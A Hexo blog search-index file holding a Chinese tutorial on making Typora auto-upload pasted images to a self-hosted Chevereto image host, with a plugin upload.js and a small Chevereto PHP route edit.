<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>typora + chevereto之博客图片终极解决方法</title>
      <link href="/p/c90ee787.html"/>
      <url>/p/c90ee787.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言"></a>前言</h2><div class="note info">            <p><a href="#jump">嫌啰嗦链接</a></p>          </div><p>生命不息，折腾不止。话说博客没写几篇，相关的一些工具倒是折腾了一堆233333</p><p>对于用<code>markdown</code>来写博客的用户来说，图片的引用问题是个众所周知的难题。其实也可以直接放在本地，但是不管是内容分享和管理都不够友好。最主要的，很多人喜欢资源文件和文章本身分开（比如我），这样看起来比较整洁，也比较方便。</p><p>所以一般<code>hexo</code>用户会用图床来存放图片，然后文章中直接引用远程链接即可。对于读者来说，反正读博客是在<code>web端</code>，那么在哪找图片是一个无感知的问题。</p><p>目前的图床应用很多，作为一个不愿意去到处注册id，同时VPS比较多的人来说，我毫不犹豫的选择了自建图床。毕竟还是自己的用起来自由。</p><p>图床应用我选的<code>chevereto</code>，个人用户来说免费版就够了，还可以当做个人相册，安装教程略，网上一大把。</p><p>关于如何将之前的本地图片迁移到<code>chevereto</code>可以看我之前的这篇文章：<a href="/p/1bcf5275.html" title="批量将hexo文章中的本地图片转到chevereto图床">批量将hexo文章中的本地图片转到chevereto图床</a></p><a id="more"></a><h2 id="准备工作"><a class="header-anchor" href="#准备工作"></a>准备工作</h2><p>将图片都迁移到了图床之后，写博客的时候需要打开图床的上传界面，然后将图片上传，再点开详情，再复制图片链接，再在文章中添加图片引用……</p><p>想想就麻烦，所以就联想到<code>chevereto</code>是支持<code>API</code>的，上文也使用过，所以就想着能不能自己写一个上传的插件，正好这时候<code>typora</code>出<code>bug</code>了，就去搜索好用的<code>markdown</code>编辑器，想给它换掉。</p><p>结果找到了这个项目<a href="https://github.com/Thobian/typora-plugins-win-img" target="_blank" rel="noopener">typora-plugins-win-img</a>，于是发现连上传插件都不用写了，有现成的了。说道这里，<code>typora</code>的<code>bug</code>我也能忍了233333。</p><hr><p><span id="jump"></span><br>下面是教程：</p><h2 id="加载typora自定义插件"><a class="header-anchor" href="#加载typora自定义插件"></a>加载<code>typora</code>自定义插件</h2><p>首先你要有一台运行<code>chevereto</code>的服务器</p><p>然后去<a href="https://github.com/Thobian/typora-plugins-win-img" target="_blank" rel="noopener">typora-plugins-win-img</a>这里下载需要的文件（也可以直接<code>git clone</code>）</p><p>下载好后长这样：</p><p><img src="http://sz.guiu.xyz/images/2020/02/26/blobd5bc49f72eaf3527.png" alt="image-20200226225336653"></p><p>其实只需要<code>plugins</code>文件夹就行了。</p><p>接下来找到你<code>typora</code>的安装目录，例如我的安装目录在<code>/usr/share/typora/</code>。</p><p>然后将<code>plugins</code>文件夹复制到<code>安装目录/resources/app/</code>下，复制完后长这样：</p><p><img src="http://sz.guiu.xyz/images/2020/02/26/blob60f3e266620cfa72.png" alt="image-20200226230123987"></p><p>然后编辑<code>window.html</code>文件：</p><p>找到<code>&lt;script src=&quot;./app/window/frame.js&quot; defer=&quot;defer&quot;&gt;&lt;/script&gt;</code></p><p>在下面添加：</p><figure class="highlight html"><figcaption><span>window.html  </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./plugins/image/upload.js"</span> <span class="attr">defer</span>=<span class="string">"defer"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改完后重启<code>typora</code>就可以加载我们自定义的插件了。</p><p>作者在插件中内置了<code>七牛云</code>，<code>腾讯云cos</code>，<code>阿里云oss</code>，<code>又拍云</code>，<code>github</code>等的上传功能，按需修改即可。</p><h2 id="修改chevereto上传代码"><a class="header-anchor" href="#修改chevereto上传代码"></a>修改<code>chevereto</code>上传代码</h2><p>没有<code>chevereto</code>，无妨，我们添加一个就是了：</p><p>编辑<code>安装目录/resources/app/plugins/upload.js</code>：</p><p>替换成以下代码：</p><figure class="highlight js"><figcaption><span>upload.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 配置信息</span></span><br><span class="line">    <span class="keyword">var</span> setting = &#123;</span><br><span class="line">        target:<span class="string">'self'</span>,</span><br><span class="line">        <span class="comment">//target=self 时涉及的配置参数</span></span><br><span class="line">        self: &#123;</span><br><span class="line">            url: <span class="string">'http://your_website/api/1/upload/'</span>,   <span class="comment">//这里填你的api地址</span></span><br><span class="line">            key: <span class="string">'YOUR_API_KEY'</span>,<span class="comment">//这里填你的APIKEY</span></span><br><span class="line">            format: <span class="string">'json'</span>,</span><br><span class="line">            <span class="comment">//自定义请求头，做校验，防止其他人随意调接口</span></span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//==============回调函数==============</span></span><br><span class="line">        <span class="comment">// 上传成功</span></span><br><span class="line">        onSuccess: <span class="function"><span class="keyword">function</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//替换图片位置</span></span><br><span class="line">            setting.element.removeAttr(locked).attr(<span class="string">'src'</span>, url);</span><br><span class="line">            setting.element.</span><br><span class="line">                parent(<span class="string">'span[md-inline="image"]'</span>).</span><br><span class="line">                data(<span class="string">'src'</span>, url).</span><br><span class="line">                find(<span class="string">'.md-image-src-span'</span>).</span><br><span class="line">                html(url);</span><br><span class="line">            <span class="comment">//提醒</span></span><br><span class="line">            <span class="keyword">var</span> text = <span class="string">'图片上传成功：'</span>+ url;</span><br><span class="line">            $(<span class="string">'#'</span>+noticeEle).</span><br><span class="line">            css(&#123;</span><br><span class="line">                <span class="string">'background'</span>:<span class="string">'rgba(0,166,90,0.7)'</span>,</span><br><span class="line">            &#125;).</span><br><span class="line">            html(text).</span><br><span class="line">            show().</span><br><span class="line">            delay(<span class="number">5000</span>).</span><br><span class="line">            fadeOut();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 上传失败</span></span><br><span class="line">        onFailure: <span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">            setting.element.removeAttr(locked);</span><br><span class="line">            $(<span class="string">'#'</span>+noticeEle).</span><br><span class="line">            css(&#123;</span><br><span class="line">                <span class="string">'background'</span>:<span class="string">'rgba(255,0,0,0.7)'</span></span><br><span class="line">            &#125;).</span><br><span class="line">            html(text).</span><br><span class="line">            show().</span><br><span class="line">            delay(<span class="number">10000</span>).</span><br><span class="line">            fadeOut();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> helper = &#123;</span><br><span class="line">        <span class="comment">// 将base64转文件流</span></span><br><span class="line">        base64ToBlob: <span class="function"><span class="keyword">function</span>(<span class="params">base64</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> arr = base64.split(<span class="string">','</span>);</span><br><span class="line">            <span class="keyword">var</span> mime = arr[<span class="number">0</span>].match(<span class="regexp">/:(.*?);/</span>)[<span class="number">1</span>] || <span class="string">'image/png'</span>;</span><br><span class="line">            <span class="comment">// 去掉url的头，并转化为byte</span></span><br><span class="line">            <span class="keyword">var</span> bytes = <span class="built_in">window</span>.atob(arr[<span class="number">1</span>]);</span><br><span class="line">            <span class="comment">// 处理异常,将ascii码小于0的转换为大于0</span></span><br><span class="line">            <span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(bytes.length);</span><br><span class="line">            <span class="comment">// 生成视图（直接针对内存）：8位无符号整数，长度1个字节</span></span><br><span class="line">            <span class="keyword">var</span> ia = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(ab);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">                ia[i] = bytes.charCodeAt(i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Blob([ab], &#123;</span><br><span class="line">                type: mime</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 根据base64获取文件扩展名</span></span><br><span class="line">        extension: <span class="function"><span class="keyword">function</span>(<span class="params">base64</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> ext = base64.split(<span class="string">','</span>)[<span class="number">0</span>].match(<span class="regexp">/data:image\/(.*?);base64/</span>)[<span class="number">1</span>] || <span class="string">'png'</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"the file ext is: "</span>+ext);</span><br><span class="line">            <span class="keyword">return</span> ext;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 根据base64获取图片内容</span></span><br><span class="line">        content: <span class="function"><span class="keyword">function</span>(<span class="params">base64</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> content = base64.split(<span class="string">','</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> content;</span><br><span class="line">        &#125;,</span><br><span class="line">        mine: <span class="function"><span class="keyword">function</span>(<span class="params">base64</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> arr  = base64.split(<span class="string">','</span>);</span><br><span class="line">            <span class="keyword">var</span> mime = arr[<span class="number">0</span>].match(<span class="regexp">/:(.*?);/</span>)[<span class="number">1</span>] || <span class="string">'image/png'</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"the file mime is: "</span>+mime);</span><br><span class="line">            <span class="keyword">return</span> mime;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 时间格式化函数</span></span><br><span class="line">        dateFormat: <span class="function"><span class="keyword">function</span> (<span class="params">date, fmt</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> o = &#123;</span><br><span class="line">                <span class="string">"M+"</span>: date.getMonth() + <span class="number">1</span>, <span class="comment">//月份</span></span><br><span class="line">                <span class="string">"d+"</span>: date.getDate(), <span class="comment">//日</span></span><br><span class="line">                <span class="string">"H+"</span>: date.getHours(), <span class="comment">//小时</span></span><br><span class="line">                <span class="string">"m+"</span>: date.getMinutes(), <span class="comment">//分</span></span><br><span class="line">                <span class="string">"s+"</span>: date.getSeconds(), <span class="comment">//秒</span></span><br><span class="line">                <span class="string">"q+"</span>: <span class="built_in">Math</span>.floor((date.getMonth() + <span class="number">3</span>) / <span class="number">3</span>), <span class="comment">//季度</span></span><br><span class="line">                <span class="string">"S"</span>: date.getMilliseconds() <span class="comment">//毫秒</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/(y+)/</span>.test(fmt)) fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (date.getFullYear() + <span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o)</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span> + k + <span class="string">")"</span>).test(fmt)) fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length == <span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span> + o[k]).substr((<span class="string">""</span> + o[k]).length)));</span><br><span class="line">            <span class="keyword">return</span> fmt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> init = &#123;</span><br><span class="line">        <span class="comment">// 上传到自己服务时的初始化方法</span></span><br><span class="line">        self: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 上传文件的方法</span></span><br><span class="line">    <span class="keyword">var</span> upload = &#123;</span><br><span class="line">        <span class="comment">// 自建服务器存储时，适用的上传方法</span></span><br><span class="line">        self : <span class="function"><span class="keyword">function</span>(<span class="params">fileData, successCall, failureCall</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> filename = helper.dateFormat((<span class="keyword">new</span> <span class="built_in">Date</span>()),<span class="string">'yyyyMMddHHmmss-'</span>)+<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="built_in">Math</span>.floor(<span class="number">999999</span>))+<span class="string">'.'</span>+helper.extension(fileData);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> fileData = helper.base64ToBlob(fileData);</span><br><span class="line">            <span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line">            formData.append(<span class="string">'key'</span>, setting.self.key);</span><br><span class="line">            formData.append(<span class="string">'format'</span>, setting.self.format);</span><br><span class="line">            formData.append(<span class="string">'source'</span>, fileData);</span><br><span class="line">            formData.append(<span class="string">'filename'</span>, filename);</span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                type: <span class="string">"POST"</span>,</span><br><span class="line">                url: setting.self.url + <span class="string">'?key='</span>+setting.self.key+<span class="string">'&amp;format='</span>+setting.self.format,</span><br><span class="line">                processData:<span class="literal">false</span>,</span><br><span class="line">                data:formData,</span><br><span class="line">                contentType: <span class="literal">false</span>,</span><br><span class="line">                success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">                    <span class="comment">//奇葩的阿里云，响应内容为空</span></span><br><span class="line">                    <span class="built_in">console</span>.log(result);</span><br><span class="line">                    successCall(result.image.url);</span><br><span class="line">                &#125;,</span><br><span class="line">                error:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(result);</span><br><span class="line">                    failureCall(<span class="string">'服务响应解析失败，请稍后再试'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取文件为base64，再回调上传函数将文件发到服务器</span></span><br><span class="line">    <span class="keyword">var</span> loadImgAndSend = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">            reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">switch</span> (setting.target) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'self'</span>:</span><br><span class="line">                        upload.self(reader.result, setting.onSuccess, setting.onFailure);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'tencent'</span>:</span><br><span class="line">                        upload.tencent(reader.result, setting.onSuccess, setting.onFailure);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'aliyun'</span>:</span><br><span class="line">                        upload.aliyun(reader.result, setting.onSuccess, setting.onFailure);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'upyun'</span>:</span><br><span class="line">                        upload.upyun(reader.result, setting.onSuccess, setting.onFailure);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'qiniu'</span>:</span><br><span class="line">                        upload.qiniu(reader.result, setting.onSuccess, setting.onFailure);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'github'</span>:</span><br><span class="line">                        upload.github(reader.result, setting.onSuccess, setting.onFailure);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        setting.onFailure(<span class="string">'配置错误，不支持的图片上传方式，可选方式：self/tencent/aliyun/qiniu/github'</span>);</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">            reader.readAsDataURL(xhr.response);</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.open(<span class="string">'GET'</span>, url);</span><br><span class="line">        xhr.responseType = <span class="string">'blob'</span>;</span><br><span class="line">        xhr.send();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 核心方法</span></span><br><span class="line">    <span class="keyword">var</span> locked = <span class="string">'doing'</span>;</span><br><span class="line">    <span class="keyword">var</span> noticeEle = <span class="string">'image-result-notice'</span>;    </span><br><span class="line">    $.image = &#123;&#125;;</span><br><span class="line">    $.image.init = <span class="function"><span class="keyword">function</span>(<span class="params">options</span>)</span>&#123;</span><br><span class="line">        options = options||&#123;&#125;;</span><br><span class="line">        setting.target = options.target||setting.target;</span><br><span class="line">        setting.self = options.self||setting.self;</span><br><span class="line">        setting.tencent = options.tencent||setting.tencent;</span><br><span class="line">        setting.aliyun = options.aliyun||setting.aliyun;</span><br><span class="line">        setting.qiniu = options.qiniu||setting.qiniu;</span><br><span class="line">        setting.github = options.github||setting.github;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 根据不同的文件存储位置，初始化不同的环境</span></span><br><span class="line">        <span class="keyword">switch</span> (setting.target) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'self'</span>:</span><br><span class="line">                init.self();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'tencent'</span>:</span><br><span class="line">                init.tencent();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'aliyun'</span>:</span><br><span class="line">                init.aliyun();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'upyun'</span>:</span><br><span class="line">                init.upyun();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'qiniu'</span>:</span><br><span class="line">                init.qiniu();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'github'</span>:</span><br><span class="line">                init.github();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 监听鼠标事件</span></span><br><span class="line">        $(<span class="string">'#write'</span>).on(<span class="string">'mouseleave click'</span>, <span class="string">'img'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> src = e.target.src;</span><br><span class="line">                <span class="keyword">if</span>( <span class="regexp">/^(https?:)?\/\//i</span>.test(src) )&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'The image already upload to server, url:'</span> + src);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                setting.element = element = $(e.target);</span><br><span class="line">                <span class="keyword">var</span> doing = element.attr(locked)==<span class="string">'1'</span>;</span><br><span class="line">                <span class="keyword">if</span>( doing )&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'uploading...'</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    element.attr(locked, <span class="string">'1'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $(<span class="string">'content'</span>).prepend(<span class="string">'&lt;div id="'</span>+noticeEle+<span class="string">'" style="position:fixed;height:40px;line-height:40px;padding:0 15px;overflow-y:auto;overflow-x:hidden;z-index:10;color:#fff;width:100%;display:none;"&gt;&lt;/div&gt;'</span>);</span><br><span class="line">                <span class="comment">//转换成普通的图片地址</span></span><br><span class="line">                <span class="comment">//src = src.substring(8, src.indexOf('?last'));</span></span><br><span class="line">                loadImgAndSend(src);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;<span class="built_in">console</span>.log(e);&#125;;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)(jQuery);</span><br><span class="line"></span><br><span class="line">$.image.init();</span><br></pre></td></tr></table></figure><p>只需要在开始部分填入相关参数即可，由于本文用不到其余图床的代码，所以这里删掉了。</p><p>然后保存退出，重新打开<code>typora</code>，粘贴图片进去就可以自动上传了。</p><p>效果图：</p><p><img src="http://sz.guiu.xyz/images/2020/02/26/Peek-2020-02-26-23-36.gif" alt="Peek-2020-02-26-23-36.gif"></p><h2 id="自定义chevereto上传用户和上传相册（可选）"><a class="header-anchor" href="#自定义chevereto上传用户和上传相册（可选）"></a>自定义<code>chevereto</code>上传用户和上传相册（可选）</h2><p><code>chevereto</code>的<code>api</code>默认会新建一个相册，但是会有<code>bug</code>，就是在相册菜单下找不到这个相册，只能从图片菜单下去打开，所以可以按照下面的方法修改<code>api</code>上传的默认相册和用户。</p><p>打开<code>chevereto</code>的<code>web</code>目录，将默认的<code>app/routes/route.api.php</code>的文件复制到<code>app/routes/overrides/route.api.php</code>文件夹，</p><p>把这段代码：</p><figure class="highlight php"><figcaption><span>rout.api.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHV\Image::uploadToWebsite($source);</span><br></pre></td></tr></table></figure><p>改成这个：(将<code>juanito</code>更换成目标用户名或用户id)</p><figure class="highlight php"><figcaption><span>rout.api.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的juanito是要传的用户，'album_id'=&gt;4是对应的相册id，按需修改</span></span><br><span class="line">CHV\Image::uploadToWebsite($source, <span class="string">'juanito'</span>, <span class="keyword">array</span>(<span class="string">'album_id'</span>=&gt;<span class="number">4</span>));</span><br></pre></td></tr></table></figure><p>然后保存即可。</p><p>也可以在<code>api</code>中指定用户和相册，只需要在<code>uploadToWebsite（）</code>方法前增加几个<code>request</code>字段就行了，不知道官方为啥不提供，可能是处于安全性考虑的吧。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> chevereto </tag>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批量将hexo文章中的本地图片转到chevereto图床</title>
      <link href="/p/1bcf5275.html"/>
      <url>/p/1bcf5275.html</url>
      
